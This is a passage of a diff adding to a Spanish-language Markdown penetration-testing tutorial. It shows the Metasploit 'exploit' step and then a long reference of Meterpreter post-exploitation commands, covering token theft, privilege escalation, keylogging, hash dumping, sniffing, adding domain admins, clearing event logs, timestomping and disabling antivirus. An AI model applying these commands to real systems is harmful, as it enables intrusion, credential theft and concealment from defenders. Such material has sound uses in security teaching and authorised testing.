@@ -127,3 +127,59 @@ set LHOST=[ip_atacante]
 set RHOST=[puerto_atacante]
 ```
 </b>
+- <b>Paso 6</b>: Ya configurado el payload (cargado en el sistema objetivo, claro está) y el Meterpreter, se procede a realizar el comienzo de ejecución del ataque como tal desde la consola de Metasploit Framework:
+<b>
+
+```
+exploit
+```
+</b>
+
+> A partir del momento de ejecución de payload en el host objetivo, ya estará disponible el acceso al sistema remoto, momento en el cual podremos utilizar cualquiera de los siguientes comandos de Meterpreter:
+
+- <b>sysinfo</b>: Muestra la información del sistema en el destino remoto.
+- <b>ls</b>: Lista de archivos y carpetas en el objetivo.
+- <b>use priv</b>: Carga el privilegio de la extensión para extender la librería de Meterpreter.
+- <b>ps</b>: Muestra todos los procesos en ejecución y que cuentas están asociadas con cada proceso.
+- <b>migrate PID</b>: Migra específicamente el proceso de ID (PID es el objetivo del proceso ID obtenido desde el comandos PS)
+- <b>use incognito: Cargar funciones de incógnito, acciones que se utilizan para robar fichas ysuplantación de una máquina de destino.
+- <b>list_tokens -u:/<b> Lista los token disponibles en el objetivo por el usuario.
+- <b>list_tokens -g</b>: Lista los token disponibles en el objetivo por el grupo.
+- <b>impersonate_token DOMAIN_NAME\\USERNAME</b>: Se hace pasar por un token disponible en el objetivo.
+- <b>steal_token PID</b>: Roba los token disponibles para un determinado proceso y hacerse pasar por esa señal.
+- <b>drop_token</b>: Deja de hacerse pasar porel token actual.
+- <b>getsystem</b>: Intento de elevación de permisos de acceso a nivel de sistema a través de múltiples vectores de ataque.
+- <b>shell</b>: Se abre un shell interactivo con todas las órdenes disponibles.
+- <b>execute -f cmd.exe -i</b>: Ejecuta rcmd.exe e interactua con él.
+- <b>execute -f cmd.exe -i -t</b>: Ejecuta cmd.exe con todas las órdenes disponibles.
+- <b>execute -f cmd.exe -i -H -t</b>: Ejecutar cmd.exe con todas las órdenes disponibles, convirtiéndolo en un proceso oculto.
+- <b>rev2self</b>: Vuelve al usuario original que se utilizó para poner en peligro el objetivo.
+- <b>reg command</b>: Interactua, crea, elimina, consulta, setea... y mucho más en el registro del destino.
+- <b>setdesktop number</b>: Cambia a una pantalla diferente en función de quién está conectado.
+- <b>screenshot</b>: Se graba una captura de pantalla de la pantalla del host objetivo en el host atacante.
+- <b>upload file</b>: Subir un archivo al objetivo.
+- <b>download file</b>: Descargar los archivos desde el objetivo.
+- <b>keyscan_start</b>: Detección de las pulsaciones de teclado en el destino remoto.
+- <b>keyscan_dump</b>: Volcado de las pulsaciones de teclas del host capturado.
+- <b>keyscan_stop</b>: Dejar de detectar las pulsaciones de teclado en el destino remoto.
+- <b>getprivs</b>: Obtener tantos privilegios como sea posible en el objetivo, siempre teniendo en cuenta que es posible que tengamos el máximo de privilegios.
+- <b>uictl enable keyboard/mouse</b>: Toma el control del teclado y/o ratón.
+- <b>background</b>: Ejecuta el shell actual de Meterpreter en segundo plano.
+- <b>hashdump</b>: Volcado de todos los hashes en el objetivo.
+- <b>use sniffer</b>: Carga del módulo sniffer.
+- <b>sniffer_interfaces</b>: Lista los interfaces disponibles del objetivo.
+- <b>sniffer_dump interfaceID pcapname</b>: Ejecuta el sniffer en el destino remoto.
+- <b>sniffer_start interfaceID packet-buffer</b>: Comienza a ejecutar el sniffer con una gama específica para un buffer de paquetes.
+- <b>sniffer_stats interfaceID</b>: Coge la información de estadística de la interfaz que está en sniffer.
+- <b>sniffer_stop interfaceID</b>: Detención del sniffer.
+- <b>add_user username password -h ip</b>: Agrega un usuario en el destino remoto.
+- <b>add_group_user “Domain Admins” username -h ip</b>: Añade un nombre de usuario al grupo Administradores de dominio en el destino remoto.
+- <b>clearev</b>: Borra el registro de eventos en el equipo de destino.
+- <b>timestomp</b>: Cambia los atributos de archivo, como fecha de creación (método antiforensics)
+- <b>reboot</b>: Reinicia el equipo de destino.
+- <b>Getcountermeasure</b>: Permite deshabilitar medidas de seguridad como antivirus, firewalls y otros.
+- <b>Gettelnet</b>: Se utiliza para habilitar telnet en la máquina de la víctima.
+- <b>Checkvm</b>: Comprobación si está ejecutando una máquina virtual o no.
+- <b>KillAV</b>: Permite desactivar la mayoría de los programas antivirus.
+- <b>ScreenSpy</b>: Realiza capturas de pantalla de forma remota.
+- <b>scrapper</b>: Permite importar una gran cantidad de información sobre el objetivo (el registro, hash, usuarios,…) a nuestra computadora.
